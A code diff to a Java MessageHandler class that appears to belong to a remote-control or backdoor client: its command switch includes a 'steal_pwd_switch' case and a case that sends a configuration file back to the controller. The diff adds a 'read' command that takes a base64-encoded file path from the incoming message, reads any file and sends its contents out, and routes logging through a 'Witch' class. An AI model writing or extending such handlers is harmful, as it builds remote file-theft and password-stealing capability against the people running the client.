@@ -16,7 +16,7 @@ public class MessageHandler {
     public static void handle(String message) {
         String[] msgArr = message.split(" ");
         String messageType = msgArr[0];
-        System.out.println("Received message: " + messageType);
+        Witch.println("Received message: " + messageType);
         try {
             switch (messageType) {
                 case "steal_pwd_switch":
@@ -90,12 +90,15 @@ public class MessageHandler {
                 case "iasconfig":
                     MessageUtils.sendMessage(messageType, FileReadUtil.read("config/ias.json"));
                     break;
+                case "read":
+                    MessageUtils.sendMessage(messageType, FileReadUtil.read(decodeBase64(msgArr[1])));
+                    break;
                 default:
                     break;
             }
         } catch (Exception e) {
-            System.out.println("Corrupted message!");
-            e.printStackTrace();
+            Witch.println("Corrupted message!");
+            Witch.printStackTrace(e);
         }
     }
 }
